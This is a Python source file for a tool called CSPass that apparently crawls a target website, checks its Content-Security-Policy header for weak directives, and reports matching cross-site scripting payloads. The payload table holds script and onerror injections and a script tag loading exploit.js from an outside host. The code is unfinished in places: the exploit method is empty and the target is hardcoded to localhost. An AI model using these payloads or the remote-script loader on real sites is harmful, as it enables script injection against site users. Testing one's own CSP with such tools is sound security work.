#! /usr/bin/env python3
# -*- coding: utf-8 -*-
# Author             : Ruulian
# Date created       : None

import argparse
import datetime
import requests
import re
from urllib.parse import urlparse
import time
from requests_html import HTMLSession

def date_formatted():
    return datetime.datetime.now().strftime("%H:%M:%S")

def escape(string:str):
    return string.translate(str.maketrans({" ":".+", "*":"\*", ".":"\.","/":"\/"}))

class Colors:
    # Foreground:
    FAIL = '\033[95m'
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    ERROR = '\033[91m'

    # Formatting
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'    
    
    # End colored text
    END = '\033[0m'
    NC ='\x1b[0m' # No Color    

class Scanner:

    general_payload = "alert()"
    
    exploits = {
        "script-src 'unsafe-inline'" : [
            f'<script>{general_payload}</script>',
            f'<img src=# onerror="{general_payload}">'
        ],
        "script-src data:" : [
            f'<script src="data:,{general_payload}"></script>'
        ],
        "script-src *" : [
            '<script src="https://0xhorizon.eu/cspass/exploit.js"></script>'
        ]
    }

    def __init__(self, target, no_colors=False, dynamic=False, all_pages=False):
        self.no_colors = no_colors
        self.all_pages = all_pages
        self.dynamic = dynamic
        self.target = target
        self.pages = [self.target]
        self.exploitable = False
        self.print()
        self.print("[<]==============================[>]")
        self.print("[<]    Python CSPass @Ruulian_   [>]")
        self.print("[<]==============================[>]")
        self.print()
        self.sess = HTMLSession()

    def print(self, message=""):
        if self.no_colors:
            message = re.sub("\x1b[\[]([0-9;]+)m", "", message)
        print(message)

    def info(self, message=""):
        self.print(f"[{Colors.BLUE}{date_formatted()}{Colors.END}] {message}")
    
    def vuln(self, message=""):
        self.print(f"[{Colors.YELLOW}VULN{Colors.END}] {message}")

    def fail(self, message=""):
        self.print(f"[{Colors.FAIL}FAIL{Colors.END}] {message}")

    def error(self, message=""):
        self.print(f"[{Colors.ERROR}ERROR{Colors.END}] {message}")

    def get_all_pages(self, page):
        r = self.sess.get(page)
        links = r.html.absolute_links
        for link in links:
            if link not in self.pages and urlparse(link).netloc == urlparse(self.target).netloc:
                self.pages.append(link)
                time.sleep(0.3)
                self.get_all_pages(link)
                return
        

    def scan(self, csp):
        for vuln, exploit in self.__class__.exploits.items():
            r = re.compile(escape(vuln))
            for policy in csp:
                if r.match(policy):
                    self.vuln(f"Potential vulnerability found: {policy}")
                    self.vuln(f"Potential working payload: {exploit[0]}\n")
                    return
        self.fail("No exploit found\n")
        
class Page:
    def __init__(self, url):
        self.url = url
        self.csp = self.get_csp()

    def get_csp(self):
        r = requests.get(self.url)
        headers = r.headers
        if 'Content-Security-Policy' in headers:
            return headers['Content-Security-Policy'].split("; ")
        else:
            return []

    def exploit(self):
        sess = HTMLSession()
        

def parse_args():
    parser = argparse.ArgumentParser(add_help=True, description='Bypass CSP to perform a XSS')

    parser.add_argument("--no-colors", dest="no_colors", action="store_true", help="Disable color mode")
    parser.add_argument("-d", "--dynamic", dest="dynamic", action="store_true", help="Use dynamic mode (uses selenium)")
    parser.add_argument("-a", "--all-pages", dest="all_pages", action="store_true", help="Looking for vulnerability in all pages could be found", required=False)

    required_args = parser.add_argument_group("Required argument")
    required_args.add_argument("-t", "--target", help="Specify the target url",  required=True)
    
    auth = parser.add_argument_group('Authentication')
    auth.add_argument("-c", "--cookie", help="Specify cookies", required=False)
    args = parser.parse_args()
    return args

if __name__ == '__main__':
    #args = parse_args()
    #scan = Scanner(target=args.target, no_colors=args.no_colors, dynamic=args.dynamic, all_pages=args.all_pages)
    scan = Scanner("http://localhost/", all_pages=True)

    scan.info(f"Starting scan on target {scan.target}\n")
    
    
    if scan.all_pages:
        scan.info("Detecting all pages...")
        scan.get_all_pages(scan.target)
        scan.info(f"{len(scan.pages)} pages found\n")
    
    for p in scan.pages:
        page = Page(p)
        scan.info(f"Scanning page {page.url}")
        if page.csp != []:
            scan.scan(page.csp)
        else:    
            scan.fail(f"No CSP on page {page.url}\n")
    